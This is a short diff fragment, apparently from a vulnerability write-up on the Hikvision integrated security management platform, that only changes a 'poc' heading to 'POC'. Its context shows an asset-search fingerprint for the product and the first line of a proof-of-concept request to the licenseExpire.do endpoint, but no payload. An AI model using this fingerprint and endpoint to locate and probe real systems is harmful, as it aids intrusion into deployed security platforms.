@@ -8,7 +8,7 @@
 app="HIKVISION-综合安防管理平台"
 ```
 
-## poc
+## POC
 
 ```
 POST /portal/cas/login/ajax/licenseExpire.do HTTP/1.1
